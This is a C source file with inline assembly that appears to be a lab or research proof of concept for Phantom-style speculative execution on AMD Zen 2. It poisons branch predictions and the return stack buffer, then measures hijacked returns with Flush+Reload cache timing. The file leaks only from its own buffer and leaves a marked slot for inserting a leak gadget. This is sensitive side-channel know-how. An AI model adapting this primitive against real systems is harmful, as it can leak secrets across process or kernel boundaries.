#include <err.h>
#include <fcntl.h>
#include <inttypes.h>
#include <setjmp.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

// Random Address for RB_PTR
#define RB_PTR 0x13370000

// Stride of 12 for 4096 byte alignment
#define RB_STRIDE_BITS 12
#define RB_STRIDE     (0x1UL << RB_STRIDE_BITS)

// 31 RSB entries
#define RSB_SIZE 31
// but 32 entries for checks
#define RB_SLOTS 0x20

#define PTRN 0x100100000000UL // Zen 2

// Defining a random address for PHANTOM_CALL
#define PHANTOM_CALL        0x40000000UL

#define ROUNDS 10000

// Define the MMAP flags
#define MMAP_FLAGS (MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_FIXED_NOREPLACE)
#define PROT_RW    (PROT_READ | PROT_WRITE)
#define PROT_RWX   (PROT_RW | PROT_EXEC)


// Determine value of threshold
#define THRESHOLD 200

// Keeping track of RB hits after an issues return (return 1 - 31)
__attribute__((aligned(4096))) static uint64_t results1[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results2[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results3[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results4[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results5[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results6[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results7[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results8[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results9[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results10[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results11[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results12[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results13[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results14[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results15[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results16[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results17[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results18[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results19[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results20[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results21[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results22[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results23[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results24[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results25[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results26[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results27[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results28[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results29[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results30[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results31[RB_SLOTS] = {0};


// alias for generating n nops
#define NOPS_str(n)            \
    ".rept " xstr(n) "\n\t"    \
    "nop\n\t"                  \
    ".endr\n\t"

// alias for turning integers into strings
#define str(s)  #s
#define xstr(s) str(s)

static inline __attribute__((always_inline)) uint64_t rdtsc(void) {
    uint64_t lo, hi;
    asm volatile("CPUID\n\t"
                 "RDTSC\n\t"
                 "movq %%rdx, %0\n\t"
                 "movq %%rax, %1\n\t"
                 : "=r"(hi), "=r"(lo)::"%rax", "%rbx", "%rcx", "%rdx");
    return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) uint64_t rdtscp(void) {
    uint64_t lo, hi;
    asm volatile("RDTSCP\n\t"
                 "movq %%rdx, %0\n\t"
                 "movq %%rax, %1\n\t"
                 "CPUID\n\t"
                 : "=r"(hi), "=r"(lo)::"%rax", "%rbx", "%rcx", "%rdx");
    return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) void test_cache_timing(uint64_t* ptr){
    asm("lfence");
    asm("mfence");

    unsigned volatile char *p = (uint8_t*) ptr;
    uint64_t t0 = rdtsc();
    *(volatile unsigned char *) p;
    uint64_t dt = rdtscp() - t0;

    asm("lfence");
    asm("mfence");

    printf("dt: %lu\n", dt);

}

// This iterates through the entire reload buffer and measures the timing access
// base + (stride * c) where stride is 4096, and c is 0 to RSB_SIZE
static inline __attribute__((always_inline)) void reload_range(long base, long stride,
                                                               int n, uint64_t *results) {
    asm("lfence");
    asm("mfence");
    int done = 0;
    
    // This is a loop that iterates through all values from 0 to n
    // The purpose for this complex setup is to avoid any memory 
    // optimizations like pre-fetching
    for (volatile int k = 0; k < n; k += 2) {
        uint64_t c = n - 1 - ((k * 13 + 9) & (n - 1));

    // Pick a slot from the reload buffer 
        unsigned volatile char *p = (uint8_t *) base + (stride * c);
    
        uint64_t t0 = rdtsc();
        *(volatile unsigned char *) p;
        uint64_t dt = rdtscp() - t0;
        
    if (dt < THRESHOLD)
            results[c]++;
        
    if (k == n - 2 && !done) {
            k = -1;
            done = 1;
        }
    }
    asm("lfence");
    asm("mfence");
}

// Flush the entire range from cache
static inline __attribute__((always_inline)) void flush_range(long start, long stride,
                                                              int n) {
    asm("lfence");
    asm("mfence");
    for (uint64_t k = 0; k < n; ++k) {
        volatile void *p = (uint8_t *) start + k * stride;
        __asm__ volatile("clflushopt (%0)\n" ::"r"(p));
        __asm__ volatile("clflushopt (%0)\n" ::"r"(p));
    }
    asm("lfence");
    asm("mfence");
}

    
// Define leak, leak_end, which are defined in the assembly below
void leak();
void leak_end();
asm(".align 0x1000\n\t"
    "leak:\n\t" 
    "nop\n\t"
    "nop\n\t"
	"nop\n\t"
// INSERT YOUR LEAK BELOW
#if 1
    "mov $" xstr(7) ", %r8\n\t"
    "shl $" xstr(RB_STRIDE_BITS) ", %r8\n\t"
    "mov " xstr(RB_PTR) "(%r8), %r8\n\t" 
#endif
    "nop\n\t"
    "nop\n\t"
    "lfence\n\t"
    "mfence\n\t" 
    NOPS_str(2000) // Extend the speculation
    "jmp *%r10\n\t"
    "leak_end:\n\t");


void PHANTOM_JUMP();

int main(int argc, char *argv[]) {
    // STAGE 1: SETUP
    
    // We first allocate the reload buffer
    // This is the buffer we use to measure cache timings
    if (mmap((void *) RB_PTR, ((RB_SLOTS + 1) << RB_STRIDE_BITS), PROT_RW, MMAP_FLAGS, -1,
             0) == MAP_FAILED) {
        err(1, "rb");
    }

    // Results of our array 
    uint64_t *results_arr[RSB_SIZE] = {
        results1,  results2,  results3,  results4,  results5,  results6,  results7,
        results8,  results9,  results10, results11, results12, results13, results14,
        results15, results16, results17, results18, results19, results20, results21,
        results22, results23, results24, results25, results26, results27, results28,
        results29, results30, results31};

    for (int k = 0; k < RSB_SIZE; k++) {
        uint64_t *res = results_arr[k];
        for (int i = 0; i < RSB_SIZE + 1; i++) {
            res[i] = 0;
        }
    }

    // Show that the addresses of result* are 4096 byte aligned
    printf("0x%lx\n", (unsigned long)&results1[0]);
    printf("0x%lx\n", (unsigned long)&results1[1]);
    printf("0x%lx\n", (unsigned long)&results1[2]);
    printf("0x%lx\n", (unsigned long)&results2[0]);

    //**********************************************
    // TEST FOR THE THRESHOLD 
    // USE results_arr to measure timing differences

    __asm__ volatile("clflushopt (%0)\n" ::"r"(results_arr[0]));
    test_cache_timing(results_arr[0]);

    __asm__ volatile("clflushopt (%0)\n" ::"r"(results_arr[0]));
    results_arr[0][0] = 0;
    test_cache_timing(results_arr[0]);

    // remove when done with threshold testing
    // return 0;


    // STAGE 2: ALLOCATING THE JUMP AND CALL
    uint64_t jmp_fn_train_alias = (uint64_t) PHANTOM_JUMP ^ PTRN;
    uint64_t call_fn_train_alias = (uint64_t) PHANTOM_CALL ^ PTRN;

    if (mmap((void *) (jmp_fn_train_alias & ~0xfff), 0x1000, PROT_RWX, MMAP_FLAGS, -1, 0) == MAP_FAILED ) {
        err(1, "jmp_fn_train");
    }

    if (mmap((void *) (PHANTOM_CALL & ~0xfff), 0x1000, PROT_RWX, MMAP_FLAGS, -1, 0) == MAP_FAILED) {
        err(1, "PHANTOM_CALL");
    }

    if (mmap((void *) (call_fn_train_alias & ~0xfff), 0x1000, PROT_RWX, MMAP_FLAGS, -1, 0) == MAP_FAILED) {
        err(1, "CALL_FN_TRAIN_ALIAS");
    }

    // Copy the leak gadget to PHANTOM_CALL
    memcpy((void *) PHANTOM_CALL, leak, leak_end - leak);


    // Insert our call and jump calls in aliased addresses
    *(uint32_t *) call_fn_train_alias = 0x00d0ff41; // call *%r8
    *(uint32_t *) jmp_fn_train_alias =  0x00e0ff41; // jmp *%r8
    
    printf("Address of PHANTOM_CALL:        0x%16lx\n", (unsigned long)PHANTOM_CALL);
    printf("Address of CALL_FN_TRAIN_ALIAS: 0x%16lx\n", (unsigned long)call_fn_train_alias);
    printf("Address of PHANTOM_JMP:         0x%16lx\n", (unsigned long)PHANTOM_JUMP);
    printf("Address of JMP_FN_TRAIN_ALIAS:  0x%16lx\n", (unsigned long)jmp_fn_train_alias);
    
    for (int i = 0; i < ROUNDS; i++) {
#if 1
        // STAGE 3: Inserting PhantomJMP
        // clang-format off
        asm("mov $1f, %%r10\n\t"
            "mov $" xstr(PHANTOM_CALL) ", %%r8\n\t"
            "jmp *%[phantom_train]\n\t"
            "1:\n\t" ::[phantom_train] "r"(jmp_fn_train_alias)
            : "r8", "r10");

        // STAGE 4: Inserting recursive PhantomCALL
        asm("mov $1f, %%r10\n\t"
            "mov $" xstr(PHANTOM_CALL) ", %%r8\n\t"
            "jmp *%[phantom_jump]\n\t"
            "1: pop %%r9\n\t" ::[phantom_jump] "r"(call_fn_train_alias)
            : "r8", "r9", "r10");
#endif 


        // STAGE 5: Priming RSB state
        asm(".index=0\n\t"
            ".rept " xstr(RSB_SIZE) "\n\t"
            "call 4f\n\t"
            "mov $.index, %%rdi\n\t"
            "shl $" xstr(RB_STRIDE_BITS) ", %%rdi\n\t"
            "mov " xstr(RB_PTR) "(%%rdi), %%r8\n\t"
            "nop\n\t"
            "4: pop %%r9\n\t"
            ".index=.index+1\n\t"
            ".endr\n\t" ::: "r8", "r9");

        // STAGE 6: Triggering PhantomJMP
        asm(
            NOPS_str(512)
            "jmp PHANTOM_JUMP\n\t"
            "a:\n\t"
            NOPS_str(512)
            NOPS_str(512)
            "PHANTOM_JUMP:\n\t"
            NOPS_str(512)
        );
        // clang-format on

        // STAGE 7: Execute RSB_SIZE returns
        for (int k = 0; k < RSB_SIZE; k++) {
            flush_range(RB_PTR, 1 << RB_STRIDE_BITS, RB_SLOTS);
            asm("mfence\n\t"
                "pushq $1f\n\t"
                "mfence\n\t"
                "clflush (%%rsp)\n\t"
                "mfence\n\t"
                "ret\n\t"
                "1:\n\t" ::
                    :);
            uint64_t *res = results_arr[k];
            reload_range(RB_PTR, 1 << RB_STRIDE_BITS, RB_SLOTS, res);
        }
    }

    // Print results
    printf("     Return: ");
    for (int i = 0; i < RSB_SIZE; i++) {
         printf(" - %05d", i + 1);
    }
    printf("\n");

    uint32_t entries_affected = 0;
    int counting = 1;
    for (int i = 0; i < RSB_SIZE; ++i) {
        printf("RB entry %02d: ", i);
        counting = 1;
        for (int k = 0; k < RSB_SIZE; k++) {
            uint64_t *res = results_arr[k];
            printf(" - %05ld", res[i]);
            if(res[i] > (int)(ROUNDS/2))
                counting = 0;
        }
        if(counting == 0)
            entries_affected++;
        printf("\n");
    }

    printf("   Hijacked: ");
    for (int i = 0; i < RSB_SIZE; i++) {
        uint64_t *res = results_arr[i];
        printf(" - %05ld", res[RSB_SIZE]);
		if(res[RSB_SIZE] > (int)(ROUNDS/2))
			entries_affected++;
    }

    printf("\n");
    printf("RSB Entries Affected: %d\n", entries_affected);
        
    return 0;
}

